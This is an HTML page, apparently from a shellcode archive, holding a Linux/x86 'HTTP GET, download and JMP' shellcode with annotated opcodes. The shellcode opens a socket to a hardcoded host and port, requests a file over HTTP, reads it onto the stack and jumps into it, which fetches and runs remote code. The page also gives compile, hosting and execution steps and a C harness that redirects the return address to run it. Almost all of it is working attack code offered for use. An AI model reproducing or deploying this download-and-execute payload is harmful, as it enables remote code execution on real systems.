<html><head><title>Linux/x86 - HTTP/1.x GET, Downloads and JMP - 68 bytes+</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* (linux/x86) HTTP/1.x GET, Downloads and JMP - 68 bytes+
 *
 * This shellcode allows you to download a binary code straight off a standard HTTP server
 * and execute it. The downloaded shellcode (e.g. binary code) will be executed on the stack.
 *
 * &lt;DEMONSTRATION&gt;:
 *
 * &gt; Starting by creating a very simple shellcode, that will be downloaded and execute.
 * 
 * root@magicbox:/tmp# cat foobar.s
 *	.section .text
 *      .global _start
 *      _start:
 *
 *		movl $0x4, %eax
 *              movl $0x1, %ebx
 *
 *              call _doint
 *                      .ascii &quot;Hello World!&quot;
 *			.byte 0xa
 *              _doint:
 *              popl %ecx
 *              movl $0xd, %edx
 *              int $0x80
 *
 *              movl $0x1, %eax
 *              int $0x80
 *
 *		# Reverse CALL
 *              call _start
 *
 * &gt; The only requirement from the downloaded shellcode, is that it will include a reverse 
 *   CALL to itself. As this shellcode does not parse the HTTP header, it has no way to know 
 *   where the downloaded shellcode begins or ends. Therefor it realys on the downloaded 
 *   shellcode to supply that, by including a CALL in the bottom, which will be JMP into.
 *
 * &gt; Compile the given shellcode 
 *
 * root@magicbox:/tmp# as -o foobar.o foobar.s
 * root@magicbox:/tmp# ld -o foobar foobar.o
 *
 * &gt; Convert this file into a raw binary (headerless, formatless)
 *
 * root@magicbox:/tmp# objcopy -O binary foobar foobar.bin
 *
 * &gt; Host this file, on some HTTP server (I haved used Apache/1.3.34)
 *
 * &gt; Use gen_httpreq.c to generate a URL request (e.g. /foobar.bin)
 *
 * &gt; Paste the gen_httpreq.c output, into this shellcode at the marked place.
 *
 * &gt; Compile this shellcode w/ the gen_httpreq output in it.
 *
 * &gt; Execute this shellcode
 * 
 * root@magicbox:/tmp# gcc -o http-download-jmp http-download-jmp.c
 * root@magicbox:/tmp# ./http-download-jmp
 * Hello World!
 * root@magicbox:/tmp#
 *
 * &lt;LINKS/UTILITIES&gt;:
 *
 *      gen_httpreq.c, generates a HTTP GET request for this shellcode
 *      &gt; http://www.tty64.org/shellcode/utilities/gen_httpreq.c
 *
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	&quot;\x6a\x66&quot;              // push $0x66 
	&quot;\x58&quot;                  // pop %eax 
	&quot;\x99&quot;                  // cltd 
	&quot;\x6a\x01&quot;              // push $0x1 
	&quot;\x5b&quot;                  // pop %ebx 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x53&quot;                  // push %ebx 
	&quot;\x6a\x02&quot;              // push $0x2 
	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x5b&quot;                  // pop %ebx 
	&quot;\x5d&quot;                  // pop %ebp 

				//
	&quot;\xbe\x80\xff\xff\xfe&quot;  // mov $0xfeffff80,%esi 
				// (0x0xfeffff80 = ~127.0.0.1)
				//

				//
	&quot;\x66\xbd\x91\x1f&quot;      // mov $0x1f91,%bp 
				// (0x1f91 = 8081/tcp)
				//

	//
	// &quot;\x66\xbd\xaf\xff&quot;	// mov $0xffaf, %bp
	//			// (0xafff = ~0080/tcp)
	// &quot;\x66\xf7\xd5&quot;       // not %bp
	//

	&quot;\xf7\xd6&quot;              // not %esi 
	&quot;\x56&quot;                  // push %esi 
	&quot;\x0f\xcd&quot;              // bswap %ebp 
	&quot;\x09\xdd&quot;              // or %ebx,%ebp 
	&quot;\x55&quot;                  // push %ebp 
	&quot;\x43&quot;                  // inc %ebx 
	&quot;\x6a\x10&quot;              // push $0x10 
	&quot;\x51&quot;                  // push %ecx 
	&quot;\x50&quot;                  // push %eax 
	&quot;\xb0\x66&quot;              // mov $0x66,%al 
	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
	&quot;\xcd\x80&quot;              // int $0x80 

	//
	// &lt;paste here the code, that gen_httpreq.c outputs!&gt;
	//

	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
	&quot;\xb0\x04&quot;              // mov $0x4,%al 
	&quot;\xcd\x80&quot;              // int $0x80 

	//
	// &lt;_recv_http_request&gt;:
	//

	&quot;\xb0\x03&quot;              // mov $0x3,%al 
	&quot;\x6a\x01&quot;              // push $0x1 
	&quot;\x5a&quot;                  // pop %edx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x41&quot;                  // inc %ecx 
	&quot;\x85\xc0&quot;              // test %eax,%eax 
	&quot;\x75\xf4&quot;              // jne &lt;_recv_http_request&gt; 
	&quot;\x83\xe9\x06&quot;          // sub $0x6,%ecx 
	&quot;\xff\xe1&quot;;             // jmp *%ecx 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
